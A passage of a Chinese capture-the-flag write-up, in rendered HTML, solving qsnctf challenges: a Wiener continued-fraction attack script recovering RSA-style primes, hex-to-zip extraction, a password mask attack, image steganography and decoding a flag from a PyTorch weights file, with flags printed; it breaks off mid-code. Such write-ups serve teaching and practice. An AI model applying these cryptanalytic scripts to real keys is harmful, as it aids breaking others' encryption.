punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\"># b'qsnctf&#123;12ff81e0-7646-4a96-a7eb-6a509ec01c9e&#125;'</span></pre></td></tr></table></figure><h3 id=\"factor1\"><a class=\"markdownIt-Anchor\" href=\"#factor1\">#</a> factor1</h3>\n<p>题目：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>d <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"qsnctf&#123;\"</span> <span class=\"token operator\">+</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">+</span> q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"&#125;\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">*</span> q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 4602579741478096718172697218991734057017874575484294836043557658035277770732473025335441717904100009903832353915404911860888652406859201203199117870443451616457858224082143505393843596092945634675849883286107358454466242110831071552006337406116884147391687266536283395576632885877802269157970812862013700574069981471342712011889330292259696760297157958521276388120468220050600419562910879539594831789625596079773163447643235584124521162320450208920533174722239029506505492660271016917768383199286913178821124229554263149007237679675898370759082438533535303763664408320263258144488534391712835778283152436277295861859</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 78665180675705390001452176028555030916759695827388719494705803822699938653475348982551790040292552032924503104351703419136483078949363470430486531014134503794074329285351511023863461560882297331218446027873891885693166833003633460113924956936552466354566559741886902240131031116897293107970411780310764816053</span></pre></td></tr></table></figure><p>维纳攻击求 p 和 q。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>       <span class=\"token comment\">#使用辗转相处将分数 x/y 转为连分数的形式</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    res<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">while</span> y<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        res<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>x<span class=\"token operator\">//</span>y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        x<span class=\"token punctuation\">,</span>y<span class=\"token operator\">=</span>y<span class=\"token punctuation\">,</span>x<span class=\"token operator\">%</span>y</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">continued_fraction</span><span class=\"token punctuation\">(</span>sub_res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    numerator<span class=\"token punctuation\">,</span>denominator<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> sub_res<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>      <span class=\"token comment\">#从 sublist 的后面往前循环</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        denominator<span class=\"token punctuation\">,</span>numerator<span class=\"token operator\">=</span>numerator<span class=\"token punctuation\">,</span>i<span class=\"token operator\">*</span>numerator<span class=\"token operator\">+</span>denominator</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> denominator<span class=\"token punctuation\">,</span>numerator   <span class=\"token comment\">#得到渐进分数的分母和分子，并返回</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#求解每个渐进分数</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">sub_fraction</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    res<span class=\"token operator\">=</span>transform<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    res<span class=\"token operator\">=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span>continued_fraction<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span>i<span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#将连分数的结果逐一截取以求渐进分数</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_pq</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>      <span class=\"token comment\">#由 p+q 和 pq 的值通过维达定理来求解 p 和 q</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    par<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>isqrt<span class=\"token punctuation\">(</span>b<span class=\"token operator\">*</span>b<span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token operator\">*</span>a<span class=\"token operator\">*</span>c<span class=\"token punctuation\">)</span>   <span class=\"token comment\">#由上述可得，开根号一定是整数，因为有解</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    x1<span class=\"token punctuation\">,</span>x2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>b<span class=\"token operator\">+</span>par<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>b<span class=\"token operator\">-</span>par<span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">*</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> x1<span class=\"token punctuation\">,</span>x2</pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">wienerAttack</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span>k<span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> sub_fraction<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\">#用一个 for 循环来注意试探 e/n 的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">if</span> k<span class=\"token operator\">==</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span>                     <span class=\"token comment\">#可能会出现连分数的第一个为 0 的情况，排除</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e<span class=\"token operator\">*</span>d<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>k<span class=\"token operator\">!=</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span>             <span class=\"token comment\">#ed=1 (mod φ(n)) 因此如果找到了 d 的话，(ed-1) 会整除 φ(n), 也就是存在 k 使得 (e*d-1)//k=φ(n)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        phi<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">*</span>d<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span>k               <span class=\"token comment\">#这个结果就是 φ(n)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        px<span class=\"token punctuation\">,</span>qy<span class=\"token operator\">=</span>get_pq<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>n<span class=\"token operator\">-</span>phi<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">if</span> px<span class=\"token operator\">*</span>qy<span class=\"token operator\">==</span>n<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            pp<span class=\"token punctuation\">,</span>qq<span class=\"token operator\">=</span><span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>qy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            flag <span class=\"token operator\">=</span> <span class=\"token string\">\"qsnctf&#123;\"</span> <span class=\"token operator\">+</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>gmpy2<span class=\"token punctuation\">.</span>isqrt<span class=\"token punctuation\">(</span>qq<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> gmpy2<span class=\"token punctuation\">.</span>isqrt<span class=\"token punctuation\">(</span>pp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"&#125;\"</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token comment\">#print(flag)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">return</span> flag</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"该方法不适用\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">4602579741478096718172697218991734057017874575484294836043557658035277770732473025335441717904100009903832353915404911860888652406859201203199117870443451616457858224082143505393843596092945634675849883286107358454466242110831071552006337406116884147391687266536283395576632885877802269157970812862013700574069981471342712011889330292259696760297157958521276388120468220050600419562910879539594831789625596079773163447643235584124521162320450208920533174722239029506505492660271016917768383199286913178821124229554263149007237679675898370759082438533535303763664408320263258144488534391712835778283152436277295861859</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">78665180675705390001452176028555030916759695827388719494705803822699938653475348982551790040292552032924503104351703419136483078949363470430486531014134503794074329285351511023863461560882297331218446027873891885693166833003633460113924956936552466354566559741886902240131031116897293107970411780310764816053</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>flag <span class=\"token operator\">=</span> wienerAttack<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>n<span class=\"token operator\">*</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># qsnctf&#123;8072e8b2982bc729cc74ef58f1abc862&#125;</span></pre></td></tr></table></figure><h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"ctfer-revenge\"><a class=\"markdownIt-Anchor\" href=\"#ctfer-revenge\">#</a> CTFer Revenge</h3>\n<p>给了 hex 文件结构，直接先提取数据</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>input_filename <span class=\"token operator\">=</span> <span class=\"token string\">'1.txt'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>output_filename <span class=\"token operator\">=</span> <span class=\"token string\">'output_filename.zip'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>input_filename<span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    hex_data <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary_data <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token keyword\">match</span> <span class=\"token keyword\">in</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r'([0-9a-fA-F]&#123;2&#125;(?: [0-9a-fA-F]&#123;2&#125;)+)'</span><span class=\"token punctuation\">,</span> hex_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    binary_data<span class=\"token punctuation\">.</span>extend<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>output_filename<span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> binary_file<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    binary_file<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>binary_data<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到的文件是一个进行逆置的压缩包形式</p>\n<p>可以使用 puzzlesolve 解决了</p>\n<p>得到里面有密码格式，所以去进行掩码攻击了</p>\n<p><img data-src=\"/img/qsnctf_round1/image-20240301170538073.png\" alt=\"image-20240301170538073\"></p>\n<blockquote b414e3e3a6449ddba0997db259203eb7=\"\">\n<p>qsnctf</p>\n</blockquote>\n<h3 id=\"多情\"><a class=\"markdownIt-Anchor\" href=\"#多情\">#</a> 多情</h3>\n<p>里面有张图片，文件尾藏了另一张图片</p>\n<p>提出来之后进行改宽高，得到下面 996 字符</p>\n<p>进行转换二进制后</p>\n<blockquote>\n<p>1111100100</p>\n</blockquote>\n<p>根据修改时间排序也可以得到 flag 的，根据上面的和文件名也能得到 flag</p>\n<p>不得不讲这题太抽象了（</p>\n<blockquote>\n<p>bv2 0</p>\n<p>bn 0</p>\n<p>QS 0</p>\n<p>Nh 0</p>\n</blockquote>\n<blockquote>\n<p>Lr 1</p>\n<p>p5 1</p>\n<p>mJ 1</p>\n<p>cd 1</p>\n<p>Eb 1</p>\n<p>f6H 1</p>\n<p>Lrp5mJcdEbbv2bnf6HQSNh 包上 qsnctf 即可</p>\n</blockquote>\n<blockquote Lrp5mJcdEbbv2bnf6HQSNh=\"\">\n<p>os: (为啥不讲结果包上 qsnctf？？</p>\n<p>qnsctf</p>\n</blockquote>\n<h3 id=\"小光的答案之书\"><a class=\"markdownIt-Anchor\" href=\"#小光的答案之书\">#</a> 小光的答案之书</h3>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMucXNuY3RmLmNvbS90aHJlYWQtNTMzLTEtMS5odG1s\">小光的答案之书</span></p>\n</blockquote>\n<p>下面有张图，图上编码图是圣堂武士密码</p>\n<p>得到密钥 life</p>\n<blockquote>\n<p>关注公众号：中学生 CTF，关键词：青少年 CTF2024</p>\n</blockquote>\n<blockquote 49e7bd5efe114cd2d93ef60ddb2f8714=\"\">\n<p>qsnctf</p>\n</blockquote>\n<h3 id=\"ez_model\"><a class=\"markdownIt-Anchor\" href=\"#ez_model\">#</a> ez_model</h3>\n<blockquote>\n<p>.<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1wdGgmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">pth</span> 文件通常是 PyTorch 中用于保存模型权重（state_dict）的文件格式。在 PyTorch 中， <code>.pth</code>  <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTYlOTYlODclRTQlQkIlQjYmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\">文件</span>包含了模型在训练过程中学到的权重参数。这样的文件可以通过 PyTorch 提供的加载机制重新装载到相同或者相似结构的模型中，从而继续训练或者进行推理。</p>\n</blockquote>\n<p>用 python 读取内容即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> torch</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>pthfile <span class=\"token operator\">=</span> <span class=\"token string\">r'G:\\sictf\\123\\easy.pth'</span>  <span class=\"token comment\"># .pth 文件的路径</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>model <span class=\"token operator\">=</span> torch<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span>pthfile<span class=\"token punctuation\">,</span> torch<span class=\"token punctuation\">.</span>device<span class=\"token punctuation\">(</span><span class=\"token string\">'cpu'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 设置在 cpu 环境下查询</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'type:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 查看模型字典长度</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'length:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> model<span class=\"token punctuation\">.</span>keys<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 查看模型字典里面的 key</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'value:'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> model<span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 查看模型字典里面的 value</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> model<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>flag tensor([ 76., 105., 100.,  85.,  74.,  51., 102.,  81.,  77.,  50.,  70.,  86.,<br>\n74., 111., 120., 112.,  68., 119.,  76., 118.,  68., 121.,  70.,  51.,<br>\n68., 119., 112.,  80., 100., 119., 120.,  79.,  69., 103.,  98.,  81.,<br>\n74., 111., 120., 110.,  69., 103., 100., 110.,  74., 103., 110., 111.,<br>\n106., 111.,  90.,  53., 109.,  70.])<br>\nhint tensor([ 90., 122.,  89., 121.,  88., 120.,  65.,  97.,  66.,  98.,  67.,  99.,<br>\n68., 100.,  69., 101.,  70., 102.,  71., 103.,  72., 104.,  73., 105.,<br>\n74., 106.,  75., 107.,  76., 108.,  77., 109.,  78., 110.,  79., 111.,<br>\n80., 112.,  81., 113.,  82., 114.,  83., 115.,  84., 116.,  85., 117.,<br>\n86., 118.,  87., 119.,  48.,  49.,  50.,  51.,  52.,  53.,  54.,  55.,<br>\n56.,  57.,  43.,  47.])</p>\n</blockquote>\n<p>整理一下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag <span class=\"token operator\">=</span><span class=\"token punctuation\">[</span> <span class=\"token number\">76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">85</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">74</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">81</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">77</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">50</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">70</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">86</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>         <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">118</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">121</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">70</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">51</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>         <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">79</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">98</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">81</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>         <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">69</span><span class=\"token punctuation\">,</span> <span class=\"token 